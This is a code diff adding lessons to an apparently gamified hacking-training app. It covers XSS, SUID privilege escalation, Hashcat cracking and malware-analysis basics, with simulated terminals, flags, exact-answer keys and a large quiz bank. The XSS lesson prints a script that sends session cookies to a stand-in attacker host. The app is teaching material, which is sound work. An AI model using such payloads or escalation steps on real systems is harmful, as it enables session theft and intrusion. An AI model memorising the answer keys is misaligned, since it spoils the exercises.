+                desc: "Learn how attackers inject malicious JavaScript into trusted websites to steal user sessions.",
+                content: `<p class="text-lg text-term-green mb-4">SQL Injection attacks the backend database. Cross-Site Scripting (XSS) attacks the <em>users</em> of the website.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The Browser Trust Model</h4>
+                          <p>When you visit a website, your web browser downloads HTML, CSS, and JavaScript. Your browser inherently trusts the JavaScript provided by the website and executes it. JavaScript is incredibly powerful: it can read your keystrokes, alter the webpage, and read your session cookies (which keep you logged in).</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The Vulnerability</h4>
+                          <p>XSS occurs when a web application takes input from a user and displays it directly back on the page <em>without sanitizing it</em>. </p>
+                          <p class="mt-2">Imagine a simple comment section on a blog. Normally, you type: <code>Great article!</code>. The server saves it, and displays it to everyone.</p>
+                          <p class="mt-2">But what if an attacker types JavaScript instead?</p>
+
+                          <div class="bg-term-black p-4 rounded border border-term-gray text-sm text-term-light font-mono my-4 overflow-x-auto whitespace-pre">
+&lt;script&gt;
+    fetch('http://hacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;</div>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">Stored vs. Reflected XSS</h4>
+                          <ul class="list-disc pl-6 space-y-4 mt-2 text-sm text-term-light/90">
+                              <li><strong>Stored XSS (Persistent):</strong> The holy grail. The attacker injects the payload into a database (like the blog comment above). Now, <em>every single user</em> who visits that blog post will silently execute the attacker's script, sending their session cookies to the hacker. The hacker can now log in as anyone who read the blog.</li>
+                              <li><strong>Reflected XSS (Non-Persistent):</strong> The payload is embedded in a malicious URL (e.g., a search query parameter). The attacker must trick a victim into clicking the specific, poisoned link. The server reflects the payload back in the search results page, executing the code in the victim's browser.</li>
+                          </ul>
+
+                          <div class="bg-term-gray/30 p-6 border-l-4 border-yellow-500 mt-8 rounded shadow-lg">
+                              <h5 class="text-yellow-500 font-bold mb-2 text-lg"><i class="fas fa-clipboard-check mr-2"></i>Module Review & Objective</h5>
+                              <p class="text-sm leading-relaxed mb-4">To prove a website is vulnerable to XSS during a penetration test, hackers usually inject a harmless payload that forces the browser to pop up an alert box. This proves JavaScript execution without actually doing anything malicious.</p>
+                              <p class="text-sm font-bold text-term-green">Objective: Craft the classic JavaScript alert payload inside HTML script tags. The payload should trigger an alert containing the number 1.</p>
+                          </div>`,
+                question: "Enter the classic Proof-of-Concept payload for XSS to trigger an alert box:",
+                exactAnswer: "<script>alert(1)<\/script>",
+                hint: "You need opening and closing script tags, and the javascript command alert(1) inside them.",
+                rewards: { xp: 180, credits: 80 }
+            },
+            {
+                id: 10, title: "System Exploitation: Privilege Escalation", type: "terminal", icon: "fa-arrow-up-right-dots", unlocks: [11], requiresProxy: true,
+                desc: "Getting a foothold on a server as a low-level user isn't enough. Learn how to exploit misconfigurations to become the absolute 'root' admin.",
+                content: `<p class="text-lg text-term-green mb-4">Congratulations, you've hacked into a server! But wait... your prompt says <code>guest$</code> instead of <code>root#</code>.</p>
+                          <p>You have a "foothold", but your permissions are highly restricted. You can't read passwords, you can't install malware, and you can't alter the firewall. You need to perform <strong>Privilege Escalation (Privesc)</strong>.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The SUID Bit (Set-User Identification)</h4>
+                          <p>In Linux, some programs need high-level privileges to run, even if a normal user executes them. For example, the <code>passwd</code> command lets a normal user change their password, but it needs to write to the highly restricted <code>/etc/shadow</code> file to save it.</p>
+                          <p class="mt-2">Linux solves this with the <strong>SUID bit</strong>. If an executable has the SUID bit set, it runs with the permissions of the <em>owner</em> of the file (usually root), regardless of who actually typed the command.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The Misconfiguration Vulnerability</h4>
+                          <p>Sometimes, lazy system administrators set the SUID bit on custom scripts, or standard tools like <code>python</code>, <code>vim</code>, or <code>bash</code> itself, so they don't have to keep typing 'sudo'.</p>
+                          <p class="mt-2 font-bold text-term-red">This is catastrophic.</p>
+                          <p class="mt-2">If an attacker finds that the <code>vim</code> text editor has the SUID bit set by root, they can open <code>vim</code> as a low-level user, but <code>vim</code> is currently operating as root! The attacker can then use vim's built-in command execution features to spawn a brand new root shell, instantly owning the entire server.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">Hunting for SUID Binaries</h4>
+                          <p>To find all files on a Linux system that have this dangerous bit set, attackers use the <code>find</code> command:</p>
+                          <div class="bg-term-black p-4 rounded border border-term-gray text-sm text-term-light font-mono my-4 overflow-x-auto whitespace-pre">
+<span class="text-term-green">find / -perm -4000 2>/dev/null</span></div>
+                          <ul class="text-xs text-term-light/70 list-disc pl-6 space-y-1">
+                              <li><code>/</code> : Start searching from the root directory.</li>
+                              <li><code>-perm -4000</code> : Look specifically for files with the SUID permission bit.</li>
+                              <li><code>2>/dev/null</code> : Hide all the "Permission Denied" errors to keep the output clean.</li>
+                          </ul>
+
+                          <div class="bg-term-gray/30 p-6 border-l-4 border-term-cyan mt-8 rounded shadow-lg">
+                              <h5 class="text-term-cyan font-bold mb-2 text-lg"><i class="fas fa-terminal mr-2"></i>Mission Briefing</h5>
+                              <p class="text-sm leading-relaxed mb-4">You have a low-privilege shell on a target DB server. The admin is known for terrible security practices. You need to escalate to root to steal the master key.</p>
+                              <p class="text-sm font-bold text-term-light mb-2">Your execution steps:</p>
+                              <ol class="list-decimal pl-4 text-sm font-sans space-y-2 text-term-light/90">
+                                  <li>Search the system for SUID binaries using the exact find command detailed above.</li>
+                                  <li>You will spot a highly unusual, custom script in the output (standard ones look like /usr/bin/passwd or /bin/su).</li>
+                                  <li>Execute that custom script by typing its full path (e.g., <code>/opt/script_name</code>).</li>
+                              </ol>
+                          </div>`,
+                terminalGoal: "Locate a vulnerable SUID binary and execute it to escalate privileges.",
+                terminalSetup: "Low-privilege SSH session established. User: www-data.",
+                objectives: [
+                    "Execute <code class='text-term-green'>find / -perm -4000 2>/dev/null</code> to locate SUID files.",
+                    "Identify the anomalous script in the output.",
+                    "Execute the script by typing its full path to gain root access."
+                ],
+                cheatsheet: [
+                    { cmd: "find / -perm -4000 2>/dev/null", desc: "Search for all SUID binaries on the system." },
+                    { cmd: "/path/to/script", desc: "Execute a specific binary or script." }
+                ],
+                terminalLogic: function(cmd) {
+                    cmd = cmd.trim().toLowerCase();
+                    if(cmd === 'find / -perm -4000 2>/dev/null' || cmd === 'find / -perm -4000') {
+                        this.findDone = true;
+                        return `Scanning filesystem...<br>
+                                /usr/bin/passwd<br>
+                                /usr/bin/su<br>
+                                /usr/bin/sudo<br>
+                                /usr/bin/pkexec<br>
+                                <span class='text-term-cyan font-bold'>/opt/sys_backup_utility</span><br>
+                                /usr/lib/dbus-1.0/dbus-daemon-launch-helper`;
+                    }
+                    if(cmd === '/opt/sys_backup_utility') {
+                        if(!this.findDone) return "bash: /opt/sys_backup_utility: No such file or directory (Hint: Map the system first!)";
+                        this.completed = true;
+                        return `Executing custom backup utility...<br>
+                                [WARNING] Running in legacy mode. Dropping to debug shell.<br>
+                                <span class='text-term-red font-bold'>root@db-server:~# </span><br>
+                                <span class='text-yellow-500 font-bold block mt-2'>FLAG{vertical_privilege_escalation_achieved}</span>`;
+                    }
+                    if(cmd === 'whoami') return "www-data";
+                    return `bash: ${cmd}: command not found. Check the Command Reference panel.`;
+                },
+                hint: "Run the find command provided in the text. Look for the file in the /opt/ directory, then just type its full path and hit enter.",
+                rewards: { xp: 250, credits: 120 }
+            },
+            {
+                id: 11, title: "Cryptography: Hashcat & Wordlists", type: "terminal", icon: "fa-unlock-keyhole", unlocks: [12],
+                desc: "You stole the password hashes in an earlier mission. Now it's time to crack them using brute computational force.",
+                content: `<p class="text-lg text-term-green mb-4">In Node 4, you learned that hashes are mathematically irreversible one-way functions. So, how do hackers 'crack' them? They don't reverse them; they guess them at terrifying speeds.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The Dictionary Attack</h4>
+                          <p>When you steal a database full of hashed passwords, you bring them back to your powerful offline cracking rig (usually equipped with multiple high-end GPUs). You then use a tool like <strong>Hashcat</strong> or <strong>John the Ripper</strong>.</p>
+                          <p class="mt-2">You provide the tool with two things:</p>
+                          <ol class="list-decimal pl-6 space-y-2 mt-2 text-sm text-term-light/90">
+                              <li>The stolen hash you want to crack.</li>
+                              <li>A massive <strong>Wordlist</strong> (like the infamous 14-million word <code>rockyou.txt</code> list, derived from a real historical data breach).</li>
+                          </ol>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The Cracking Loop</h4>
+                          <p>Hashcat takes the first word in the dictionary (e.g., "123456"), hashes it using the exact same algorithm the website used, and compares the resulting hash to your stolen hash. If they don't match, it moves to the second word (e.g., "password"), hashes it, and checks again.</p>
+                          <p class="mt-2">Modern GPUs can perform <em>tens of billions</em> of these hashing operations every single second. If your password is in that wordlist, it will be cracked in fractions of a millisecond.</p>
+
+                          <div class="bg-term-gray/30 p-6 border-l-4 border-term-cyan mt-8 rounded shadow-lg">
+                              <h5 class="text-term-cyan font-bold mb-2 text-lg"><i class="fas fa-terminal mr-2"></i>Mission Briefing</h5>
+                              <p class="text-sm leading-relaxed mb-4">We exfiltrated an MD5 hash belonging to the CEO: <br><code class="text-term-red break-all bg-term-black p-1">5f4dcc3b5aa765d61d8327deb882cf99</code></p>
+                              <p class="text-sm font-bold text-term-light mb-2">Your execution steps:</p>
+                              <ol class="list-decimal pl-4 text-sm font-sans space-y-2 text-term-light/90">
+                                  <li>Run the Hashcat utility.</li>
+                                  <li>Syntax: <code class="text-term-green">hashcat -m 0 hash.txt rockyou.txt</code> (where -m 0 specifies the MD5 algorithm).</li>
+                                  <li>Wait for the GPU cluster to find the collision and retrieve the plain-text password.</li>
+                              </ol>
+                          </div>`,
+                terminalGoal: "Run Hashcat to crack the stolen MD5 hash.",
+                terminalSetup: "GPU Rig: 4x RTX 4090 active. Loaded hash.txt (1 target). Loaded rockyou.txt (14M rules).",
+                objectives: [
+                    "Execute <code class='text-term-green'>hashcat -m 0 hash.txt rockyou.txt</code> to begin the cracking job."
+                ],
+                cheatsheet: [
+                    { cmd: "hashcat -m [type] [hashfile] [wordlist]", desc: "Offline hash cracking utility." }
+                ],
+                terminalLogic: function(cmd) {
+                    cmd = cmd.trim().toLowerCase();
+                    if(cmd === 'hashcat -m 0 hash.txt rockyou.txt') {
+                        this.completed = true;
+                        return `hashcat (v6.2.5) starting...<br><br>
+                                OpenCL API (OpenCL 3.0 CUDA 11.6.112) - Platform #1 [NVIDIA Corporation]<br>
+                                =====================================================================<br>
+                                * Device #1: NVIDIA GeForce RTX 4090, 24115/24564 MB, 128MCU<br><br>
+                                Hashes: 1 digests; 1 unique digests, 1 unique salts<br>
+                                Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>
+                                Dictionary cache hit:<br>
+                                * Filename..: rockyou.txt<br>
+                                * Passwords.: 14344385<br>
+                                * Bytes.....: 139921507<br>
+                                * Keyspace..: 14344385<br><br>
+                                5f4dcc3b5aa765d61d8327deb882cf99:<span class='text-term-green font-bold text-lg'>password123</span><br><br>
+                                Session..........: hashcat<br>
+                                Status...........: Cracked<br>
+                                Hash.Mode........: 0 (MD5)<br>
+                                Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99<br>
+                                Time.Started.....: Tue Sep 15 14:40:01 2026 (0 secs)<br>
+                                Time.Estimated...: Tue Sep 15 14:40:01 2026 (0 secs)<br>
+                                Speed.Dev.#1.....:  15340.5 MH/s (0.00ms) @ Accel:64 Loops:1024 Thr:1024<br>
+                                <span class='text-yellow-500 font-bold block mt-2'>FLAG{offline_cracking_exposes_weak_passwords}</span>`;
+                    }
+                    if(cmd.startsWith('hashcat')) return "Error: Invalid hashcat syntax. Ensure you specify the mode (-m 0), the target file (hash.txt), and the wordlist (rockyou.txt).";
+                    return `bash: ${cmd}: command not found. Check the Command Reference panel.`;
+                },
+                hint: "Type exactly: hashcat -m 0 hash.txt rockyou.txt",
+                rewards: { xp: 200, credits: 100 }
+            },
+            {
+                id: 12, title: "Endpoint Security: Malware Analysis Basics", type: "quiz", icon: "fa-bug", unlocks: [],
+                desc: "Shift to the defensive perspective (Blue Team). Learn how security analysts reverse-engineer and study malicious software.",
+                content: `<p class="text-lg text-term-green mb-4">You have learned how to attack. Now, let's learn how defenders analyze the weapons attackers leave behind.</p>
+                          <p>When a company is breached, the Incident Response (IR) team often finds strange executables or scripts on compromised machines. They must analyze this <strong>Malware</strong> (Malicious Software) to figure out what it does, who it communicates with, and how to stop it.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The Safe Room: Sandboxing</h4>
+                          <p>Rule #1 of Malware Analysis: <strong>Never run malware on your host machine or the corporate network.</strong></p>
+                          <p class="mt-2">Analysts use heavily monitored, isolated Virtual Machines (VMs) called <strong>Sandboxes</strong>. These VMs have no internet connection to the real world (to prevent the malware from spreading or alerting the hacker) but simulate a fake internet so the malware thinks it's succeeding.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">Static vs. Dynamic Analysis</h4>
+                          <p>There are two primary phases of analyzing a malicious file:</p>
+
+                          <ul class="list-none space-y-4 mt-4 text-sm text-term-light/90">
+                              <li class="bg-term-black p-4 rounded border border-term-gray"><strong class="text-term-cyan text-base">Static Analysis (Looking at the code):</strong> Analyzing the malware <em>without running it</em>. You are looking at the raw bytes, extracting human-readable text (strings), checking the file's hash against databases like VirusTotal, and reverse-engineering the assembly code using tools like Ghidra or IDA Pro. It is safe, but highly sophisticated malware will obfuscate or encrypt its code to hide from Static Analysis.</li>
+
+                              <li class="bg-term-black p-4 rounded border border-term-gray"><strong class="text-term-cyan text-base">Dynamic Analysis (Watching the behavior):</strong> This is "detonating" the bomb. You intentionally execute the malware inside the Sandbox and watch what it does. Does it try to modify the Windows Registry? Does it delete shadow volume backups (classic Ransomware behavior)? Does it try to reach out to a Command and Control (C2) IP address? Tools like Process Monitor and Wireshark are used to record the carnage.</li>
+                          </ul>
+
+                          <div class="bg-term-gray/30 p-6 border-l-4 border-yellow-500 mt-8 rounded shadow-lg">
+                              <h5 class="text-yellow-500 font-bold mb-2 text-lg"><i class="fas fa-clipboard-check mr-2"></i>Module Review & Objective</h5>
+                              <p class="text-sm leading-relaxed mb-4">Static analysis is safe but can be tricked by obfuscation. Dynamic analysis shows the true behavior but carries the risk of executing the payload. A good analyst uses both.</p>
+                              <p class="text-sm font-bold text-term-green">Objective: Identify the analytical approach that involves intentionally executing the malware in a controlled environment to observe its actions.</p>
+                          </div>`,
+                question: "Which phase of malware analysis involves executing the malicious file inside an isolated sandbox to observe registry changes, file modifications, and network callouts?",
+                options: [
+                    "Static Analysis",
+                    "Dynamic Analysis",
+                    "Reverse Engineering",
+                    "Open Source Intelligence (OSINT)"
+                ],
+                answer: 1,
+                hint: "Think about the difference between looking at the blueprint of a bomb (Static) versus intentionally detonating it in a concrete bunker to see the blast radius.",
+                rewards: { xp: 120, credits: 50 }
+            }
+        ];
+
+        // =====================================================================
+        //  EXTENDED CURRICULUM DATABASE  (300+ modules)
+        // =====================================================================
+        const CURRICULUM = [
+            ["Ch. 10 — Networking Fundamentals","The OSI Model","The OSI model splits network communication into seven layers, from Physical (1) up to Application (7).","How many layers does the OSI model define?",["4 layers","5 layers","6 layers","7 layers"],3,"Count from Physical up to Application."],
+            ["Ch. 10 — Networking Fundamentals","The TCP Three-Way Handshake","TCP establishes a connection with SYN, SYN-ACK, then ACK before data flows.","Which sequence correctly completes the TCP three-way handshake?",["SYN, ACK, FIN","SYN, SYN-ACK, ACK","ACK, SYN, RST","SYN, FIN, ACK"],1,"The client asks, the server agrees, the client confirms."],
+            ["Ch. 10 — Networking Fundamentals","UDP vs TCP","UDP is connectionless with no delivery or ordering guarantees, which makes it fast but unreliable.","Which transport protocol is connectionless and offers no delivery guarantee?",["TCP","UDP","SCTP","SFTP"],1,"Think of streaming and DNS queries."],
+            ["Ch. 10 — Networking Fundamentals","Common Port: HTTPS","HTTPS runs over TCP port 443 and wraps HTTP inside TLS.","Which port does HTTPS use by default?",["21","22","80","443"],3,"One above 80 plus a secure suffix."],
+            ["Ch. 10 — Networking Fundamentals","Common Port: SSH","SSH listens on TCP port 22 and provides encrypted remote shells and tunnelling.","Which port does SSH use by default?",["22","23","25","443"],0,"It replaced insecure Telnet."],
+            ["Ch. 10 — Networking Fundamentals","DNS Resolution","DNS translates human-readable domain names into IP addresses.","What is the primary purpose of DNS?",["Assign IP addresses to hosts","Translate domain names into IP addresses","Encrypt web traffic","Route packets between networks"],1,"It is the internet's phone book."],
+            ["Ch. 10 — Networking Fundamentals","DNS Record Types","MX records tell mail servers where to deliver email for a domain.","Which DNS record type directs email delivery for a domain?",["A record","CNAME record","MX record","TXT record"],2,"Mail eXchange."],
+            ["Ch. 10 — Networking Fundamentals","Private IP Ranges","RFC 1918 defines 10.0.0.0/8, 172.16.0.0/12 and 192.168.0.0/16 as private.","Which of these is a private IPv4 range?",["8.8.8.0/24","172.16.0.0/12","11.0.0.0/8","203.0.113.0/24"],1,"Starts with 172 and sits in the teens."],
+            ["Ch. 10 — Networking Fundamentals","Subnetting Basics","A /24 network contains 256 addresses, of which 254 are usable for hosts.","How many usable host addresses does a /24 IPv4 subnet provide?",["62","126","254","256"],2,"Two addresses are reserved for network and broadcast."],
+            ["Ch. 10 — Networking Fundamentals","ARP","ARP resolves an IPv4 address to a MAC address on the local segment.","ARP resolves which mapping?",["Domain name to IP address","IP address to MAC address","MAC address to port number","Port number to protocol"],1,"It bridges layer 3 and layer 2."],
+            ["Ch. 10 — Networking Fundamentals","Default Gateway","The default gateway forwards traffic destined for networks outside the local subnet.","What is the role of a default gateway?",["Assigns DNS names","Forwards traffic destined for other networks","Filters malware","Encrypts internal traffic"],1,"It is the exit door of your subnet."],
+            ["Ch. 10 — Networking Fundamentals","NAT","Network Address Translation maps private addresses to public ones so many hosts share one address.","NAT primarily exists to do what?",["Encrypt packets","Translate private addresses into public ones","Assign MAC addresses","Block ICMP"],1,"Think of your home router sharing one ISP address."],
+            ["Ch. 10 — Networking Fundamentals","DHCP DORA","DHCP leases addresses through Discover, Offer, Request, Acknowledge.","Which sequence describes the DHCP lease process?",["Discover, Offer, Request, Acknowledge","Offer, Discover, Acknowledge, Request","Request, Offer, Discover, Acknowledge","Discover, Request, Offer, Acknowledge"],0,"DORA is the mnemonic."],
+            ["Ch. 10 — Networking Fundamentals","ICMP","ICMP carries control and error messages and powers tools like ping.","Which protocol does the ping utility rely on?",["TCP","UDP","ICMP","ARP"],2,"It is the network layer's messenger."],
+            ["Ch. 10 — Networking Fundamentals","Time To Live","Each router decrements a packet's TTL by one, dropping it when it reaches zero.","What happens to a packet TTL each time it passes through a router?",["It doubles","It is decremented by one","It resets to 255","It is hashed"],1,"It is a hop counter with a self-destruct."],
+            ["Ch. 10 — Networking Fundamentals","VLANs","A VLAN logically segments one physical switch into isolated broadcast domains.","What does a VLAN primarily provide?",["Logical network segmentation on shared hardware","Faster Wi-Fi","Automatic encryption","DNS failover"],0,"One switch, many separate networks."],
+            ["Ch. 10 — Networking Fundamentals","IPv6 Addressing","IPv6 addresses are 128 bits long, compared with 32 bits for IPv4.","How many bits are in an IPv6 address?",["32 bits","64 bits","128 bits","256 bits"],2,"Four times the size of an IPv4 address."],
+            ["Ch. 10 — Networking Fundamentals","Loopback Address","127.0.0.1 always refers to the local machine itself.","Which address is the IPv4 loopback address?",["0.0.0.0","127.0.0.1","169.254.0.1","255.255.255.255"],1,"There is no place like 127.0.0.1."],
+            ["Ch. 10 — Networking Fundamentals","SMB Port","Server Message Block shares files and printers, historically on TCP 445.","Which port does SMB commonly use on modern Windows networks?",["139","445","514","3389"],1,"It replaced NetBIOS over 139."],
+            ["Ch. 10 — Networking Fundamentals","DNS Zone Transfers","An unauthenticated AXFR can hand an attacker the entire internal DNS record set.","A DNS zone transfer (AXFR) is dangerous because it can do what?",["Crash the server","Reveal the full internal DNS record set","Encrypt the zone","Delete records"],1,"It is a full database copy of the zone."],
+
+            ["Ch. 11 — Linux & Command Line","chmod Numeric Permissions","chmod 755 grants rwx to the owner and r-x to group and others.","What permissions does chmod 755 apply?",["rwxr-xr-x","rw-r--r--","rwxrwxrwx","r-xr-xr-x"],0,"7 equals read plus write plus execute."],
+            ["Ch. 11 — Linux & Command Line","The Shadow File","Hashed passwords live in /etc/shadow, readable only by root.","Where are hashed Linux user passwords stored?",["/etc/passwd","/etc/shadow","/etc/hosts","/var/log/auth.log"],1,"It is the file even root must be careful with."],
+            ["Ch. 11 — Linux & Command Line","grep","grep searches text for lines matching a pattern.","Which command searches file contents for a pattern?",["find","grep","dd","mount"],1,"Its name comes from a text editor command."],
+            ["Ch. 11 — Linux & Command Line","Pipes","The pipe operator sends the stdout of one command into the stdin of another.","What does the pipe operator do?",["Appends to a file","Sends stdout of one command to stdin of another","Runs a command in the background","Redirects stderr"],1,"It chains commands together."],
+            ["Ch. 11 — Linux & Command Line","sudo","sudo runs a command with the privileges of another user, usually root.","What does sudo do?",["Encrypts a file","Runs a command with another user's privileges","Lists processes","Mounts a disk"],1,"It is how normal users borrow root."],
+            ["Ch. 11 — Linux & Command Line","Process Listing","ps aux lists every running process with its owner and command line.","Which command lists running processes with full detail?",["ps aux","df -h","du -sh","uptime"],0,"The u and x flags add users and hidden processes."],
+            ["Ch. 11 — Linux & Command Line","Listening Ports","ss -tulpn shows listening TCP and UDP sockets with the owning process.","Which command shows listening sockets and their processes?",["ss -tulpn","lsblk","free -m","uname -a"],0,"It replaced the older netstat."],
+            ["Ch. 11 — Linux & Command Line","Finding Files","The find utility searches by name, size, owner or permission bits.","Which command can locate files by permission bits such as SUID?",["ls","grep","find","cat"],2,"It walks the filesystem and applies tests."],
+            ["Ch. 11 — Linux & Command Line","Archives with tar","tar bundles many files into a single archive, optionally compressed.","What does tar do?",["Compiles source code","Archives multiple files into one","Encrypts files","Rotates logs"],1,"Think tape archive."],
+            ["Ch. 11 — Linux & Command Line","Cron Jobs","The cron daemon runs recurring scheduled jobs defined in crontab files.","Which daemon runs scheduled recurring jobs from crontab files?",["cron","cups","auditd","rsyslog"],0,"Attackers love it for persistence."],
+            ["Ch. 11 — Linux & Command Line","systemctl","systemctl manages systemd units such as services and timers.","Which command manages systemd services?",["service --list","systemctl","initctl","svcadm"],1,"Start, stop, enable, status."],
+            ["Ch. 11 — Linux & Command Line","Shell Configuration","~/.bashrc holds per-user shell settings and runs on interactive shell start.","What is ~/.bashrc for?",["System-wide boot configuration","Per-user shell configuration","Kernel module loading","Firewall rules"],1,"It is your personal shell startup file."],
+            ["Ch. 11 — Linux & Command Line","SSH Keys","ssh-keygen creates a public and private key pair used for passwordless authentication.","What does ssh-keygen generate?",["A TLS certificate","An SSH public and private key pair","A password hash","A VPN tunnel"],1,"The private half never leaves your machine."],
+            ["Ch. 11 — Linux & Command Line","Log Locations","Most Linux log files live under /var/log, including auth.log and syslog.","Where do most Linux log files live?",["/etc","/var/log","/tmp","/proc"],1,"It is the variable, writable data directory."],
+            ["Ch. 11 — Linux & Command Line","Signals","kill -9 sends SIGKILL, which cannot be caught or ignored.","Which signal does kill -9 send?",["SIGTERM","SIGKILL","SIGHUP","SIGINT"],1,"It is the uncatchable kill."],
+            ["Ch. 11 — Linux & Command Line","Current User","whoami prints the effective username of the current context.","Which command prints the current effective username?",["id -u","whoami","who","users"],1,"It answers the simplest question in a shell."],
+            ["Ch. 11 — Linux & Command Line","umask","umask defines the default permission bits stripped from newly created files.","What does umask control?",["Default permissions for new files","User password policy","Process priority","Disk quotas"],0,"It subtracts from the default mode."],
+            ["Ch. 11 — Linux & Command Line","su vs sudo","su switches you to another user entirely, while sudo grants per-command privileges.","What is the key difference between su and sudo?",["su needs no password","sudo grants per-command privileges while su switches user entirely","They are identical","sudo only works on Debian"],1,"One is a door, the other is a key."],
+
+            ["Ch. 12 — Windows & Active Directory","The SAM Database","Local Windows password hashes are stored in the SAM database.","Where does Windows store local password hashes?",["NTFS journal","SAM database","Registry Run key","Pagefile"],1,"It is the Security Account Manager hive."],
+            ["Ch. 12 — Windows & Active Directory","NTLM Weaknesses","NTLM challenge and response can be relayed or cracked offline.","NTLM authentication is vulnerable mainly because of what?",["It uses AES","The challenge and response can be relayed or cracked offline","It requires Kerberos","It is open source"],1,"It has no mutual authentication."],
+            ["Ch. 12 — Windows & Active Directory","Kerberos TGT","The Key Distribution Center issues a Ticket Granting Ticket first.","In Kerberos, what does the KDC issue first?",["Service ticket","Ticket Granting Ticket","Refresh token","Session cookie"],1,"It is your proof of identity for the realm."],
+            ["Ch. 12 — Windows & Active Directory","Kerberoasting","Kerberoasting requests service tickets for accounts with SPNs and cracks them offline.","Kerberoasting targets which accounts?",["Domain controllers only","Service accounts with SPNs and their crackable tickets","DNS records","SMB shares"],1,"Look for accounts with Service Principal Names."],
+            ["Ch. 12 — Windows & Active Directory","Golden Ticket","A Golden Ticket forges Kerberos tickets using the krbtgt account hash.","A Golden Ticket attack requires the hash of which account?",["Administrator","krbtgt","Guest","SYSTEM"],1,"It is the key to the entire Kerberos realm."],
+            ["Ch. 12 — Windows & Active Directory","LSASS Credential Dumping","LSASS holds credential material in memory, which is why attackers dump it.","Why do attackers dump LSASS memory?",["To clear logs","It holds credential material in memory","To disable antivirus","To edit GPOs"],1,"It is the login authority of Windows."],
+            ["Ch. 12 — Windows & Active Directory","Group Policy","GPOs centrally enforce settings across domain-joined machines.","What is a Group Policy Object used for?",["Centrally enforcing settings on domain machines","Encrypting disks","Routing traffic","Managing DNS zones"],0,"It is how admins push configuration at scale."],
+            ["Ch. 12 — Windows & Active Directory","Domain Controllers","Domain Controllers authenticate users and store the Active Directory database.","What is the role of a Domain Controller?",["Hosts websites","Authenticates users and stores AD data","Provides DHCP only","Manages backups"],1,"Compromise one and you own the domain."],
+            ["Ch. 12 — Windows & Active Directory","Built-in Administrator","The local Administrator account has a well-known RID of 500.","Which built-in account has RID 500?",["Guest","Local Administrator","SYSTEM","DefaultAccount"],1,"It exists on every Windows machine."],
+            ["Ch. 12 — Windows & Active Directory","PowerShell Abuse","PowerShell gives deep OS access and supports fileless, in-memory execution.","Why is PowerShell favoured by attackers?",["It is slow","It offers deep OS access and fileless execution","It requires admin rights","It cannot be logged"],1,"It is a scripting engine already installed everywhere."],
+            ["Ch. 12 — Windows & Active Directory","Pass-the-Hash","NTLM hashes can be used directly for authentication without cracking them.","Pass-the-Hash works because of what?",["Hashes can be used directly for authentication without cracking","Hashes are reversible","Passwords are stored in plaintext","Kerberos is disabled"],0,"You do not need the password if you have the hash."],
+            ["Ch. 12 — Windows & Active Directory","BloodHound","BloodHound graphs Active Directory relationships to reveal attack paths.","What does BloodHound map?",["Network routes","Attack paths through AD relationships","Firewall rules","Disk usage"],1,"It answers who can reach whom."],
+            ["Ch. 12 — Windows & Active Directory","NTFS ACLs","NTFS access control lists define which users and groups can read or write a file.","What does an NTFS ACL define?",["File permissions per user or group","Disk partitioning","Network routes","Registry keys"],0,"It is the permission table on every file."],
+            ["Ch. 12 — Windows & Active Directory","Registry Hives","HKLM stores system-wide configuration, HKCU stores the current user's settings.","Which hive stores system-wide configuration?",["HKCU","HKLM","HKCR only","NTUSER.DAT"],1,"Local Machine means the whole computer."],
+            ["Ch. 12 — Windows & Active Directory","Process Monitor","Procmon from Sysinternals shows live file, registry, process and network activity.","Which Sysinternals tool shows real-time file, registry and network activity?",["Autoruns","Process Monitor","PsExec","Disk2vhd"],1,"It is the go-to behaviour analysis tool."],
+            ["Ch. 12 — Windows & Active Directory","SMB Relay","SMB relay attacks succeed when SMB signing is disabled.","SMB relay attacks succeed primarily when what is true?",["SMB signing is disabled","Firewalls are off","IPv6 is enabled","DNS is internal"],0,"Without signing, the server cannot tell who really sent it."],
+
+            ["Ch. 13 — Web Technologies & HTTP","HTTP is Stateless","Each HTTP request is independent and carries no built-in memory of previous requests.","Why is HTTP described as stateless?",["It cannot carry data","Each request is independent with no built-in session memory","It uses UDP","It is encrypted"],1,"Cookies exist precisely to work around this."],
+            ["Ch. 13 — Web Technologies & HTTP","GET vs POST","GET requests should be safe and should not change server state.","Which is true of GET requests?",["They should not change server state","They are always encrypted","They cannot have parameters","They must use JSON"],0,"They are meant to be idempotent reads."],
+            ["Ch. 13 — Web Technologies & HTTP","HTTP 403","403 means the server understood the request but refuses to authorise it.","What does HTTP 403 mean?",["Not found","Forbidden, the server understood but refuses","Server error","Redirect"],1,"You are known, and you are not allowed."],
+            ["Ch. 13 — Web Technologies & HTTP","HTTP 500","500 signals an unexpected condition on the server side.","What does HTTP 500 indicate?",["Client error","Redirect","Internal server error","Success"],2,"It is the generic server-side failure."],
+            ["Ch. 13 — Web Technologies & HTTP","HTTP 302","302 indicates a temporary redirect to a different location.","What does HTTP 302 indicate?",["Permanent redirect","Temporary redirect","Unauthorized","Bad gateway"],1,"The resource has moved, but only for now."],
+            ["Ch. 13 — Web Technologies & HTTP","HttpOnly Cookies","HttpOnly stops client-side JavaScript from reading a cookie.","What does the HttpOnly cookie flag do?",["Blocks JavaScript access to the cookie","Encrypts the cookie","Makes it permanent","Restricts it to HTTPS"],0,"It defeats XSS cookie theft."],
+            ["Ch. 13 — Web Technologies & HTTP","Same-Origin Policy","The same-origin policy prevents scripts from one origin reading resources from another.","The same-origin policy restricts what?",["Scripts from one origin reading resources from another","Cookies","TLS versions","DNS lookups"],0,"Origin means scheme plus host plus port."],
